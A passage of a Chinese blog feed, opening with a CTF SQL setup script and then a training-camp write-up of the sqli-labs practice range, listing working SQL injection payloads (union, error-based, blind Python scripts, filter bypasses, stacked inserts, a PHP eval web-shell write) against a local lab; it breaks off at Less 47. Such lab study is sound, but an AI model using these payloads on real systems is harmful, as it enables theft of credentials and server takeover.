class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> kali;<br>USE kali;<br><br>SET SQL_MODE = &quot;NO_AUTO_VALUE_ON_ZERO&quot;;<br>START TRANSACTION;<br>SET time_zone = &quot;+00:00&quot;;<br><br><span class="hljs-keyword">CREATE</span> TABLE <span class="hljs-symbol">`users`</span> (<br>  <span class="hljs-symbol">`username`</span> varchar(<span class="hljs-number">10</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>,<br>  <span class="hljs-symbol">`password`</span> varchar(<span class="hljs-number">30</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-keyword">PRIMARY</span> <span class="hljs-keyword">KEY</span> (<span class="hljs-symbol">`username`</span>)<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;<br><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-symbol">`users`</span> (<span class="hljs-symbol">`username`</span>, <span class="hljs-symbol">`password`</span>) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;flag&#123;123abc#&#125;&#x27;</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-symbol">`users`</span> (<span class="hljs-symbol">`username`</span>, <span class="hljs-symbol">`password`</span>) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;xin&#x27;</span>, <span class="hljs-string">&#x27;DALLAS&#x27;</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-symbol">`users`</span> (<span class="hljs-symbol">`username`</span>, <span class="hljs-symbol">`password`</span>) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;SALES&#x27;</span>, <span class="hljs-string">&#x27;CHICAGO&#x27;</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-symbol">`users`</span> (<span class="hljs-symbol">`username`</span>, <span class="hljs-symbol">`password`</span>) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;OPERATIONS&#x27;</span>, <span class="hljs-string">&#x27;BOSTON&#x27;</span>);<br>COMMIT;<br></code></pre></td></tr></table></figure><p>难度也变得非常智障</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/07/16：夏令营week1记录:sql-lab</title>
    <link href="/2023/07/16/sql-lab/"/>
    <url>/2023/07/16/sql-lab/</url>
    
    <content type="html"><![CDATA[<p>判断封闭过滤-&gt;搜集信息（数据库名、表名、字段名等）-&gt;注入<br>部署在localhost:8081</p><h2 id="Page-1"><a href="#Page-1" class="headerlink" title="Page 1"></a>Page 1</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less 1"></a>Less 1</h3><p>依标题这是get型，没有过滤（用#会直接报错）<br>尝试下<code>?id=1&#39;</code>，报错，再用<code>?id=1&#39;--+</code>，字符型<br>输入<code>?id=1&#39; order by 3--+</code>正常显示，改为4报错，判断有3列<br>获得数据库信息：<code>?id=-1&#39; union select 1,database(),3--+</code>结果为security<br>表：<code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+</code>结果为users<br>字段：<code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</code>由题目，选择username和password<br>结果：<code>?id=-1&#39; union select 1,2,group_concat(username,id,password) from users --+</code></p><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less 2"></a>Less 2</h3><p>跟上一题差不多，不过数字型去掉单引号即可</p><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less 3"></a>Less 3</h3><p>输入?id=1’时报错信息中有括号，在单引号后补个括号后剩下步骤与Less 1差不多</p><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less 4"></a>Less 4</h3><p>输入?id=1’正常，输入?id=1”报错且报错信息中有括号，与Less 1类似</p><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less 5"></a>Less 5</h3><p>题目说明本题双注<br>单引号闭合<br>方法一：双注<br>双注： 当查询语句的前面出现聚合函数 就是多个返回结果count()就是多行的意思 后面的查询结果代码会以错误的形式显示出来<br>原理：<br>count等聚合函数之后，如果使用分组语句，就会把查询的一部分以错误的形式显示出来<br>可能使用到的语句：<br>rand():遵循四舍五入把原值转化为指定小数位数，当不指定时，返回一个介于 0 到 1（不包括 0 和 1）之间的伪随机 float 值<br>floor:向下舍入为指定小数位数<br>ceiling:向上舍入为指定小数位数<br>注入语句：<br><code>select count(*) from [table] group by concat(&#39;~&#39;,([真正的查询语句]),&#39;~&#39;，floor(rand(0)*2))</code><br>或<br><code>select count(*),concat_ws(char(32,58,32),([查询语句]),floor(rand(0)*2)) as a from [table] group by a</code><br>使用floor(rand()*2)返回结果只有0和1，当为0时报错<br>获得数据库信息：<code>?id=-1&#39; union all select count(*),2,concat( &#39;~&#39;,(select schema_name from information_schema.schemata limit 4,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.schemata group by a %23</code><br>获得表：<code>?id=-1&#39; union all select count(*),2,concat( &#39;~&#39;,(select table_name from information_schema.tables where table_schema = &#39;security&#39; limit 3,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.schemata group by a %23</code><br>获得字段：<code>?id=-1&#39; union all select count(*),1,concat( &#39;~&#39;,(select column_name from information_schema.columns where table_name= &#39;users&#39; limit 2,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.schemata group by a %23</code><br>结果：<code>?id=-1&#39; union all select count(*),1,concat( &#39;~&#39;,(select concat(id,username,password) from users limit 2,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.schemata group by a %23</code><br>方法二：盲注<br>本题无回显也可以考虑盲注<br>由于有报错回显，可使用布尔盲注</p><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less 6"></a>Less 6</h3><p>双引号闭合，剩下步骤与上相同<br>使用sqlmap：<br>python sqlmap.py -u “<a href="http://localhost:8081/Less-6/?id=1&quot;">http://localhost:8081/Less-6/?id=1&quot;</a> –current-db<br>返回：security</p><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less 7"></a>Less 7</h3><p>导出文件型<br>使用outfile 写入到服务器，可以利用这个漏洞写入一句话马<br>需要验证几个条件：<br>1.获取文件的可读<br><code>1&#39;)) and (select count(*) from mysql.user)&gt;0 %23</code><br>2.注入文件<br><code>id=-1&#39;)) union select 1,2,3 into outfile &quot;绝对地址&quot; %23</code><br>3.<code>id=-1&#39;)) union select 1,&quot;&lt;?php @eval($_POST[&#39;giantbranch&#39;]);?&gt;&quot; into outfile &quot;XXX\test.php&quot; %23</code><br>但尝试后出不来</p><p>可以让sqlmap执行相同工作（</p><h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less 8"></a>Less 8</h4><p>布尔型盲注<br>找了个脚本</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs csharp">import requests<br><br>success_url = <span class="hljs-string">&quot;http://localhost:8081/Less-8/?id=1&quot;</span><br>success_response_len = len(requests.<span class="hljs-keyword">get</span>(success_url).text)<br><br><span class="hljs-function">def <span class="hljs-title">get_DBName_len</span>():</span><br><span class="hljs-function">    DBName_len</span> = <span class="hljs-number">0</span><br>    url_template = success_url + <span class="hljs-string">&quot;&#x27; and (length(database())=&#123;0&#125;) %2D%2D%20&quot;</span><br>    <span class="hljs-function"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-title">range</span>(<span class="hljs-params"><span class="hljs-number">1</span>,<span class="hljs-number">20</span></span>):</span><br><span class="hljs-function">        url</span> = url_template.format(i)<br>        response = requests.<span class="hljs-keyword">get</span>(url)<br>        <span class="hljs-function"><span class="hljs-keyword">if</span> <span class="hljs-title">len</span>(<span class="hljs-params">response.text</span>)</span> == success_response_len:<br>            DBName_len = <span class="hljs-function">i</span><br><span class="hljs-function">            <span class="hljs-title">print</span>(<span class="hljs-params"><span class="hljs-string">&quot;DBName_len is:&quot;</span>,DBName_len</span>)</span><br><span class="hljs-function">            <span class="hljs-keyword">break</span></span><br><span class="hljs-function">    <span class="hljs-keyword">return</span> DBName_len</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">get_DBName_len</span>()</span><br></code></pre></td></tr></table></figure><h3 id="Less-9-amp-10"><a href="#Less-9-amp-10" class="headerlink" title="Less 9 &amp; 10"></a>Less 9 &amp; 10</h3><p>均为时间盲注<br>引号闭合不同</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">length</span>(database())=<span class="hljs-number">8</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ </span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>))<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><h3 id="Less-11-14"><a href="#Less-11-14" class="headerlink" title="Less 11 - 14"></a>Less 11 - 14</h3><p>与 1-4 类似，但改为POST型</p><h3 id="Less-15-amp-16"><a href="#Less-15-amp-16" class="headerlink" title="Less 15 &amp; 16"></a>Less 15 &amp; 16</h3><p>post时间盲注，引号闭合不同</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> <span class="hljs-type">time</span> <span class="hljs-keyword">import</span> <span class="hljs-type">time</span><br>url = &quot;http://192.168.64.135/Less-15/&quot;<br><span class="hljs-type">char</span> = &quot;abcdefghijklmnopqrstuvwxyz_&quot;<br>print(&quot;start!&quot;)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">database</span> = &quot;&quot;<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">20</span>):<br>        <span class="hljs-keyword">for</span> str <span class="hljs-keyword">in</span> <span class="hljs-type">char</span>:<br><br>            time1 = <span class="hljs-type">time</span>()<br>            data = &#123;<span class="hljs-string">&#x27;uname&#x27;</span>:&quot;admin&#x27;and if((mid((select schema_name from information_schema.schemata limit %d,1),%d,1))=&#x27;%s&#x27;,sleep(0.1),1)#&quot;%(i,j,str),<span class="hljs-string">&#x27;passwd&#x27;</span>:&quot;1&quot;&#125;<br>            res = requests.post(url,data=data)<br>            //使用mid截断判断<br>            time2 = <span class="hljs-type">time</span>()<br><br>            <span class="hljs-keyword">if</span> (time2-time1 &gt; <span class="hljs-number">0.1</span> ):<br>                <span class="hljs-keyword">database</span> += str<br>                #print(<span class="hljs-keyword">database</span>)<br>                break<br>    print(&quot;the %d database: &quot;% (i+<span class="hljs-number">1</span>))<br>    print(<span class="hljs-keyword">database</span>)<br>print(&quot;end!&quot;)<br></code></pre></td></tr></table></figure><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less 17"></a>Less 17</h3><p>根据提示为密码更新，尝试后发现有报错信息<br>报错注入：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-string">&#x27; and updatexml(1, concat(0x7e,database(),0x7e),1) # 数据库</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) # 数据表<br><span class="hljs-string">&#x27; and updatexml(1, concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 3,1),0x7e),1)# 字段</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> concat(id,<span class="hljs-number">0x7e</span>,username,<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">limit</span> <span class="hljs-number">7</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) # 数据<br></code></pre></td></tr></table></figure><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less 18"></a>Less 18</h3><p>先对ip尝试注入，无效<br>用admin/admin登录，发现存在回显显示了User Agent<br>测试闭合，存在报错信息</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&#x27; or updatexml(1, concat(0x7e,database(),0x7e),1) or &#x27;</span> <span class="hljs-regexp">//</span>获得数据库<br>余下与上相似<br></code></pre></td></tr></table></figure><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less 19"></a>Less 19</h3><p>用admin/admin登录，存在回显Referer<br>测试闭合，存在报错信息<br>与18同，但是换了个位置</p><h3 id="Less-20（写不出来，修改cookie就收不到请求包）"><a href="#Less-20（写不出来，修改cookie就收不到请求包）" class="headerlink" title="Less 20（写不出来，修改cookie就收不到请求包）"></a>Less 20（写不出来，修改cookie就收不到请求包）</h3><p>针对cookie头部注入<br>（跑不出来）<br>cookie中的uname补单引号会出现报错信息，可以进行报错注入<br>也可直接使用联合注入语句</p><h2 id="Page-2"><a href="#Page-2" class="headerlink" title="Page 2"></a>Page 2</h2><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less 21"></a>Less 21</h3><p>仍然是在cookie注入，但是经过base64编码，将注入语句编码即可<br>该题为<code>&#39;)</code>闭合</p><h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less 22"></a>Less 22</h3><p>与21区别闭合改为双引号</p><h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less 23"></a>Less 23</h3><p>过滤了注释，无法用<code>#</code>和<code>--</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1 &#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">database</span>() <span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name = <span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username),group_concat(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less 24"></a>Less 24</h3><p>二次注入：对二次调用函数没有进行过滤，导致用户可以通过构造payload绕过去修改其他用户的密码<br>先注册账号<code>admin &#39; #</code>并登录，然后对密码进行修改<br>登录admin，使用刚刚修改的密码发现登录成功</p><h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less 25"></a>Less 25</h3><p>过滤or和and<br>查看源码，黑名单将这两个关键字替换为空格，可以使用双写绕过<br>可使用报错注入，直接联合注入也有回显</p><h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less 25a"></a>Less 25a</h3><p>25的升级变为盲注<br>联合注入+时间盲注脚本</p><h3 id="Less-26-amp-26a"><a href="#Less-26-amp-26a" class="headerlink" title="Less 26 &amp; 26a"></a>Less 26 &amp; 26a</h3><p>过滤注释和空格<br>也可以直接使用报错注入<br>关于过滤：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">绕过空格：<span class="hljs-variable">%09</span> tab键 <span class="hljs-variable">%0</span>a 新建一行 <span class="hljs-variable">%0</span><span class="hljs-keyword">c</span> 新的一页 <span class="hljs-variable">%od</span> return功能 <span class="hljs-variable">%0</span>b tab键垂直 <span class="hljs-variable">%a0</span> 空格<br>绕过<span class="hljs-keyword">and</span>：&amp;&amp;<br>绕过<span class="hljs-keyword">or</span>：||<br>绕过注释：注释，分号闭合，冒号<span class="hljs-variable">%00</span>截断<br></code></pre></td></tr></table></figure><p>联合注入：</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">?id=&#x27;<span class="hljs-built_in">%a</span>0union<span class="hljs-built_in">%a</span>0select<span class="hljs-built_in">%a</span>01,<span class="hljs-number">2</span>,database()<span class="hljs-built_in">%a</span>0&#x27;<br></code></pre></td></tr></table></figure><p>报错注入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br></code></pre></td></tr></table></figure><p>26a升级盲注，但使用联合注入<code>union select 1,2,3</code>仍有回显</p><h3 id="Less-27-amp-27a"><a href="#Less-27-amp-27a" class="headerlink" title="Less 27 &amp; 27a"></a>Less 27 &amp; 27a</h3><p>过滤union和select两个关键字及注释空格<br>可以使用大小写绕过</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span>&#x27;<span class="hljs-variable">%0</span>aUnIoN<span class="hljs-variable">%0</span>aSeleCt<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-comment">;%00</span><br></code></pre></td></tr></table></figure><h3 id="Less-28-amp-28a"><a href="#Less-28-amp-28a" class="headerlink" title="Less 28 &amp; 28a"></a>Less 28 &amp; 28a</h3><p>在27的基础上增加大小写的过滤<br><code>?id=&#39;)%A0UnIoN%A0SeLeCt%A01,3,4%26%26%a0(&#39;1</code></p><h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less 29"></a>Less 29</h3><p>看wp需要利用HPP漏洞<br>HPP是“ HTTP Parameter Pollution ”的缩写，即“ HTTP 参数污染 ”，<br>通常在一个请求中，同样名称的参数只会出现一次，但是在 HTTP 协议中是允许同样名称的参数出现多次的。<br>在这里选择注入<code>?id=1&amp;id=0</code>，第一个参数进入WAF（jsp服务器，在这题起到防火墙的作用），第二个参数则直接输出，在第二个参数中注入即可</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less 30"></a>Less 30</h3><p>同样方法，改双引号</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less 31"></a>Less 31</h3><p>同样方式</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?id=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">0</span><span class="hljs-string">&quot;)%20union%20select%201,2,database()%20--+</span><br></code></pre></td></tr></table></figure><h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less 32"></a>Less 32</h3><p>会对特殊字符添加转义字符\（如addslashes()函数）<br>这里需要宽字节注入，利用数据库编码与前端编码不一致</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-variable">%df</span>&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-number">3</span> <span class="hljs-variable">%23</span><br></code></pre></td></tr></table></figure><p>这里<code>%df</code>超过两个字节，单引号逃逸</p><h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less 33"></a>Less 33</h3><p>提示绕过addslashes()<br>addslashes()：返回在预定义字符（引号，反斜杠）之前添加反斜杠的字符串。<br>与Less 32同</p><h3 id="Less-34（写不出来）"><a href="#Less-34（写不出来）" class="headerlink" title="Less 34（写不出来）"></a>Less 34（写不出来）</h3><p>改为POST，与上差不多，但跑不出来</p><h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less 35"></a>Less 35</h3><p>这里没有引号闭合和任何过滤，直接输入联合注入语句即可</p><h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less 36"></a>Less 36</h3><p>转义字符</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\x00</span> <span class="hljs-string">\n</span> <span class="hljs-string">\r</span> <span class="hljs-string">\</span> <span class="hljs-string">&#x27; &quot; \x1a</span><br></code></pre></td></tr></table></figure><p>可以用相同方法绕过</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=-<span class="hljs-number">1</span>%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less 37"></a>Less 37</h3><p>改为post型，大体与上同</p><h2 id="Page-3"><a href="#Page-3" class="headerlink" title="Page 3"></a>Page 3</h2><h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less 38"></a>Less 38</h3><p>需要堆叠注入，即通过将多条语句通过；隔开写在一起构成多语句</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-number">666</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>) --+<br></code></pre></td></tr></table></figure><h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less 39"></a>Less 39</h3><p>不用闭合直接注入</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-number">666</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less 40"></a>Less 40</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1&#x27;);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-number">666</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>) --+<br></code></pre></td></tr></table></figure><h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less 41"></a>Less 41</h3><p>添加了盲注，先延时注入判断字段名再使用堆叠注入即可</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-number">666</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less 42"></a>Less 42</h3><p>POST型，密码处报错，单引号闭合，注入点在密码栏<br>点击注册账号，提示为堆叠注入需创造新账号<br>在密码栏处输入联合注入语句获得字段等信息后进行堆叠注入</p><h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less 43"></a>Less 43</h3><p>将闭合改为<code>&#39;)</code>余下相同</p><h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less 44"></a>Less 44</h3><p>改为盲注，单引号闭合，余下类似</p><h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less 45"></a>Less 45</h3><p>盲注，闭合<code>&#39;)</code>，同上</p><h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less 46"></a>Less 46</h3><p>输入sort的值，说明与order by拼接<br>输入4，存在报错语句，采用报错注入</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">4</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0x7e</span>,database(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less 47"></a>Less 47</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 